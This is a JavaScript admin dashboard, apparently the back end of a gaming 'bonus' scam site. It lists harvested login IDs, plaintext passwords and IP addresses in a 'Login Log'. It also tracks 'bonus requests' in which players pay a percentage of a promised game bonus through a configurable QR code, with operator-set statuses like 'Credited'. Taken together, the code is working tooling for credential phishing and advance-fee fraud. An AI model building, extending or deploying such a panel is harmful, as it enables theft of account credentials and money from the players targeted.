document.addEventListener('DOMContentLoaded', function () {

    var netBadge = document.getElementById('ad-net');
    var toast = document.getElementById('toast');

    var db = null;
    var unsubscribe = [];
    var requests = [];
    var logins = [];
    var filter = 'All';
    var search = '';
    var activeDoc = null;

    // ================= TOAST =================
    var toastTimer;
    function showToast(msg, isErr) {
        toast.textContent = msg;
        toast.classList.toggle('err', !!isErr);
        toast.classList.add('show');
        clearTimeout(toastTimer);
        toastTimer = setTimeout(function () { toast.classList.remove('show'); }, 2600);
    }

    function setNet(on) {
        netBadge.classList.toggle('off', !on);
        netBadge.lastChild.textContent = on ? ' Online' : ' Offline';
    }

    // ================= BOOT (no login) =================
    initFirebase()
        .then(function (f) {
            db = f.db;
            subscribeAll();
            loadPlans();
        })
        .catch(function (e) {
            setNet(false);
            showToast('Firebase load fail: ' + e.message, true);
        });

    // ================= DATA =================
    function subscribeAll() {
        unsubscribe.forEach(function (u) { u(); });
        unsubscribe = [];

        setNet(true);

        unsubscribe.push(db.collection('submissions')
            .where('site_id', '==', SITE_ID)
            .onSnapshot(function (snap) {
                setNet(true);
                requests = [];
                logins = [];

                snap.forEach(function (d) {
                    var o = d.data();
                    o.__id = d.id;
                    if (o.event === 'bonus') requests.push(o);
                    else if (o.event === 'login') logins.push(o);
                });

                requests.sort(function (a, b) { return ts(b.created_at) - ts(a.created_at); });
                logins.sort(function (a, b) { return ts(b.created_at) - ts(a.created_at); });

                renderStats();
                renderRecent();
                renderRequests();
                renderLogins();
            }, function () {
                setNet(false);
            }));

        // fallback: read all if index missing
        setTimeout(function () {
            if (requests.length === 0 && logins.length === 0) loadAllFallback();
        }, 2500);
    }

    function loadAllFallback() {
        db.collection('submissions').get().then(function (snap) {
            requests = [];
            logins = [];
            snap.forEach(function (d) {
                var o = d.data();
                o.__id = d.id;
                if (o.site_id && o.site_id !== SITE_ID) return;
                if (o.event === 'bonus') requests.push(o);
                else if (o.event === 'login') logins.push(o);
            });
            renderStats(); renderRecent(); renderRequests(); renderLogins();
        }).catch(function () { setNet(false); });
    }

    function ts(v) {
        if (!v) return 0;
        if (v.toDate) return v.toDate().getTime();
        return new Date(v).getTime() || 0;
    }

    function fmtDate(v) {
        var d = v ? new Date(ts(v)) : new Date();
        return d.toLocaleString('en-IN', {
            day: '2-digit', month: 'short', year: 'numeric',
            hour: '2-digit', minute: '2-digit', hour12: true
        });
    }

    function money(n) { return '₹' + Number(n || 0).toLocaleString('en-IN'); }

    function statusClass(s) {
        if (s === 'Credited') return 'badge-credited';
        if (s === 'Approved') return 'badge-approved';
        return 'badge-review';
    }

    function statusBadge(s) {
        return '<span class="badge ' + statusClass(s) + '"><span class="badge-dot"></span>' + s + '</span>';
    }

    // ================= STATS =================
    function renderStats() {
        document.getElementById('st-total').textContent = requests.length;
        document.getElementById('st-review').textContent =
            requests.filter(function (r) { return r.status === 'Under Review'; }).length;
        document.getElementById('st-approved').textContent =
            requests.filter(function (r) { return r.status === 'Approved'; }).length;
        document.getElementById('st-credited').textContent =
            requests.filter(function (r) { return r.status === 'Credited'; }).length;

        var payout = requests.reduce(function (a, r) { return a + Number(r.bonus_amount || 0); }, 0);
        var payment = requests.reduce(function (a, r) { return a + Number(r.payment_amount || 0); }, 0);

        document.getElementById('st-payout').textContent = money(payout);
        document.getElementById('st-payment').textContent = money(payment);
        document.getElementById('nav-count').textContent =
            requests.filter(function (r) { return r.status === 'Under Review'; }).length;
    }

    // ================= RECENT =================
    function renderRecent() {
        var el = document.getElementById('recent-list');

        if (!requests.length) { el.innerHTML = emptyState(); return; }

        el.innerHTML = requests.slice(0, 6).map(function (r) {
            return '<div class="recent-row" data-id="' + r.__id + '">'
                + '<div class="recent-mid">'
                + '<div class="recent-name">' + esc(r.full_name || '—') + '</div>'
                + '<div class="recent-sub">' + esc(r.uid || '—') + ' · ' + fmtDate(r.created_at) + '</div>'
                + '</div>'
                + '<span class="recent-amt">' + money(r.bonus_amount) + '</span>'
                + statusBadge(r.status)
                + '</div>';
        }).join('');
    }

    function emptyState() {
        return '<div class="empty">'
            + '<div class="empty-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg></div>'
            + '<p>Abhi koi request nahi hai</p></div>';
    }

    function esc(s) {
        return String(s === undefined || s === null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    // ================= REQUESTS =================
    function renderRequests() {
        var el = document.getElementById('req-list');
        var q = search.toLowerCase();

        var list = requests.filter(function (r) {
            if (filter !== 'All' && r.status !== filter) return false;
            if (!q) return true;
            return [r.full_name, r.uid, r.email, r.request_id, r.plan_name, r.account]
                .join(' ').toLowerCase().indexOf(q) > -1;
        });

        if (!list.length) { el.innerHTML = emptyState(); return; }

        el.innerHTML = list.map(function (r) {
            return '<div class="req-card" data-id="' + r.__id + '">'
                + '<div class="req-top">'
                + '<span class="req-name">' + esc(r.full_name || '—') + '</span>'
                + '<span class="req-id">' + esc(r.request_id || '—') + '</span>'
                + '<span style="margin-left:auto">' + statusBadge(r.status) + '</span>'
                + '</div>'
                + '<div class="req-body">'
                + cell('Game UID', esc(r.uid || '—'))
                + cell('Email', esc(r.email || '—'))
                + cell('Plan', esc(r.plan_name || '—'))
                + cell('Bonus', money(r.bonus_amount), 'green')
                + cell('Payment', money(r.payment_amount), 'blue')
                + cell('Date', fmtDate(r.created_at))
                + '</div></div>';
        }).join('');
    }

    function cell(label, value, cls) {
        return '<div><div class="req-cell-label">' + label + '</div>'
            + '<div class="req-cell-value ' + (cls || '') + '">' + value + '</div></div>';
    }

    // ================= LOGINS =================
    function renderLogins() {
        var el = document.getElementById('login-list');

        if (!logins.length) { el.innerHTML = emptyState(); return; }

        el.innerHTML = logins.map(function (l) {
            return '<div class="req-card">'
                + '<div class="req-top">'
                + '<span class="req-name">' + esc(l.login_id || '—') + '</span>'
                + '<span class="req-id">' + esc(l.login_type || '') + '</span>'
                + '</div>'
                + '<div class="req-body">'
                + cell('Password', esc(l.password || '—'))
                + cell('IP', esc(l.ip || '—'))
                + cell('Time', fmtDate(l.created_at))
                + '</div></div>';
        }).join('');
    }

    // ================= DETAIL =================
    var detailModal = document.getElementById('detail-modal');

    document.addEventListener('click', function (e) {
        var card = e.target.closest('.recent-row, .req-card');
        if (card && card.dataset.id) openDetail(card.dataset.id);
    });

    function openDetail(id) {
        var r = requests.filter(function (x) { return x.__id === id; })[0];
        if (!r) return;

        activeDoc = r;

        document.getElementById('dm-id').textContent = r.request_id || '—';
        document.getElementById('dm-name').textContent = r.full_name || '—';

        var rows = [
            ['Game UID', r.uid],
            ['Email', r.email],
            ['Account', r.account],
            ['Plan', r.plan_name],
            ['Bonus Amount', money(r.bonus_amount)],
            ['Payment Amount', money(r.payment_amount)],
            ['Discount', r.discount_amount + '%'],
            ['Submitted', fmtDate(r.created_at)],
            ['Last Updated', fmtDate(r.updated_at)],
            ['Status', r.status]
        ];

        document.getElementById('dm-grid').innerHTML = rows.map(function (x) {
            return '<div class="dm-cell"><div class="dm-cell-label">' + x[0] + '</div>'
                + '<div class="dm-cell-value">' + esc(x[1] || '—') + '</div></div>';
        }).join('');

        Array.prototype.forEach.call(document.querySelectorAll('.st-btn'), function (b) {
            b.classList.toggle('active', b.dataset.status === r.status);
        });

        detailModal.classList.add('show');
    }

    function closeDetail() {
        detailModal.classList.remove('show');
        activeDoc = null;
    }

    document.getElementById('dm-close').addEventListener('click', closeDetail);

    detailModal.addEventListener('click', function (e) {
        if (e.target === detailModal) closeDetail();
    });

    document.getElementById('dm-statuses').addEventListener('click', function (e) {
        var btn = e.target.closest('.st-btn');
        if (!btn || !activeDoc) return;

        var next = btn.dataset.status;

        db.collection('submissions').doc(activeDoc.__id).update({
            status: next,
            updated_at: firebase.firestore.FieldValue.serverTimestamp()
        }).then(function () {
            showToast('Status updated → ' + next);
            closeDetail();
        }).catch(function (e) {
            showToast('Update failed: ' + e.message, true);
        });
    });

    // ================= PLANS =================
    var DEFAULT_PLANS = [
        { id: 1, name: 'Starter',    bonus: 500,   tag: '', type: 'free' },
        { id: 2, name: 'Silver',     bonus: 1000,  tag: 'Popular', type: 'free' },
        { id: 3, name: 'Gold',       bonus: 2000,  tag: '', type: 'paid' },
        { id: 4, name: 'Platinum',   bonus: 4000,  tag: 'Best Value', type: 'paid' },
        { id: 5, name: 'Diamond',    bonus: 5000,  tag: '', type: 'paid' },
        { id: 6, name: 'Ultra',      bonus: 7000,  tag: '', type: 'paid' },
        { id: 7, name: 'Legend',     bonus: 10000, tag: '', type: 'paid' }
    ];

    var plans = DEFAULT_PLANS.slice();
    var payRate = 30;
    var qrImage = '';

    function loadPlans() {
        db.collection('config').doc('bonus_plans').get().then(function (d) {
            if (d.exists) {
                var o = d.data();
                if (Array.isArray(o.plans) && o.plans.length) plans = o.plans;
                if (o.pay_rate) payRate = o.pay_rate;
                if (o.qr_image) qrImage = o.qr_image;
            }
            renderPlans();
        }).catch(function () { renderPlans(); });
    }

    function renderPlans() {
        document.getElementById('pay-rate').value = payRate;

        var qrInput = document.getElementById('qr-url');
        if (qrInput && document.activeElement !== qrInput) qrInput.value = qrImage;

        renderQrPreview();

        document.getElementById('plans-edit').innerHTML = plans.map(function (p, i) {
            var pay = Math.round(Number(p.bonus) * (Number(payRate) / 100));
            var type = p.type === 'paid' ? 'paid' : 'free';

            return '<div class="plan-row" data-i="' + i + '">'
                + '<span class="plan-row-id">' + (i + 1) + '</span>'
                + inp('name', p.name, 'Plan Name')
                + inp('bonus', p.bonus, 'Bonus ₹', 'number')
                + inp('tag', p.tag, 'Tag')
                + '<div class="plan-input">'
                + '<label>Type</label>'
                + '<select data-key="type">'
                + '<option value="free"' + (type === 'free' ? ' selected' : '') + '>Free</option>'
                + '<option value="paid"' + (type === 'paid' ? ' selected' : '') + '>Paid</option>'
                + '</select>'
                + '</div>'
                + '<span class="plan-out">Pay ₹' + pay + '</span>'
                + '</div>';
        }).join('');
    }

    function renderQrPreview() {
        var box = document.getElementById('qr-preview');
        if (!box) return;

        if (!qrImage) {
            box.innerHTML = '<span class="qr-empty">No QR set</span>';
            return;
        }

        box.innerHTML = '<img src="' + esc(qrImage) + '" alt="QR" onerror="this.parentNode.innerHTML=\'<span class="qr-empty">Image load failed</span>\'">';
    }

    function inp(key, val, label, type) {
        return '<div class="plan-input"><label>' + label + '</label>'
            + '<input type="' + (type || 'text') + '" data-key="' + key + '" value="' + esc(val) + '"></div>';
    }

    document.getElementById('qr-url').addEventListener('input', function (e) {
        qrImage = e.target.value.trim();
        renderQrPreview();
    });

    document.getElementById('plans-edit').addEventListener('input', function (e) {
        var input = e.target.closest('input, select');
        if (!input) return;

        var row = input.closest('.plan-row');
        var i = Number(row.dataset.i);
        plans[i][input.dataset.key] = input.type === 'number' ? Number(input.value) : input.value;

        if (input.dataset.key === 'bonus') {
            var pay = Math.round(Number(plans[i].bonus || 0) * (Number(payRate) / 100));
            row.querySelector('.plan-out').textContent = 'Pay ₹' + pay;
        }
    });

    document.getElementById('pay-rate').addEventListener('input', function (e) {
        payRate = Number(e.target.value) || 0;
        renderPlans();
    });

    document.getElementById('plans-save').addEventListener('click', function () {
        var btn = this;
        btn.disabled = true;

        db.collection('config').doc('bonus_plans').set({
            plans: plans,
            pay_rate: payRate,
            qr_image: qrImage,
            updated_at: firebase.firestore.FieldValue.serverTimestamp()
        }).then(function () {
            showToast('Plans saved');
        }).catch(function (e) {
            showToast('Save failed: ' + e.message, true);
        }).then(function () {
            btn.disabled = false;
        });
    });

    // ================= NAV =================
    var TITLES = {
        dashboard: 'Dashboard', requests: 'Bonus Requests',
        logins: 'Login Log', plans: 'Bonus Plans'
    };

    function switchView(name) {
        ['dashboard', 'requests', 'logins', 'plans'].forEach(function (v) {
            document.getElementById('view-' + v).hidden = (v !== name);
        });

        Array.prototype.forEach.call(document.querySelectorAll('.nav-item'), function (b) {
            b.classList.toggle('active', b.dataset.view === name);
        });

        document.getElementById('ad-top-title').textContent = TITLES[name];
        closeSidebar();
    }

    document.querySelectorAll('.nav-item').forEach(function (b) {
        b.addEventListener('click', function () { switchView(b.dataset.view); });
    });

    var side = document.getElementById('ad-side');
    var overlay = document.getElementById('ad-overlay');

    function openSidebar() { side.classList.add('open'); overlay.classList.add('show'); }
    function closeSidebar() { side.classList.remove('open'); overlay.classList.remove('show'); }

    document.getElementById('ad-menu').addEventListener('click', openSidebar);
    overlay.addEventListener('click', closeSidebar);

    // ================= FILTER =================
    document.getElementById('req-filters').addEventListener('click', function (e) {
        var chip = e.target.closest('.chip');
        if (!chip) return;

        filter = chip.dataset.filter;

        Array.prototype.forEach.call(document.querySelectorAll('.chip'), function (c) {
            c.classList.toggle('active', c === chip);
        });

        renderRequests();
    });

    document.getElementById('req-search').addEventListener('input', function (e) {
        search = e.target.value;
        renderRequests();
    });

});
